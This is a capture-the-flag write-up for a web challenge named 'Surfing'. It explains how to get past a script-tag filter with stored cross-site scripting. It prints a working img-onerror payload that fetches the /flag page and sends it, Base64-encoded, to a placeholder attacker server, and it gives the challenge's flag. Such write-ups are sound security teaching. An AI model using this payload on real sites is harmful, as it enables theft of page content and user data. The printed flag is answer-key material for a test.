# Surfing

I have now removed your ability to send in script tags. I have also changed the cookie permissions so you can't steal it. Finally, I moved the flag to `/flag`. Have fun getting the flag now.

**Note: Do NOT use automated/bruteforce tools on this challenge. There will be some delay before the admin reads your comment, so please be patient.**

## Dev Notes

Lock this challenge behind baked solve.

## Solution

Similar to baked, we must use Cross-Site Scripting in order to steal the flag. For this challenge, since we cannot use `<script></script>` tags, we can use `<img src=x onerror="PAYLOAD HERE">` instead. We also need to exfiltrate a page, which requires more JavaScript. I make a JavaScript payload and shrunk the payload with a JS Minifier. Below is the payload I used:

```<img src=x onerror="xh=new XMLHttpRequest;xh.onreadystatechange=function(){4==xh.readyState&&fetch('http://<YOUR_SERVER_IP>?'+encodeURI(btoa(xh.responseText)))},xh.open('GET','http://localhost:8000/flag',!0),xh.send();">```

Using this payload, we are able to exfiltrate the page in Base64 encoding. Once decoded, we get the flag. 

flag:
`gigem{5urf1ng_4_fl4g5}`
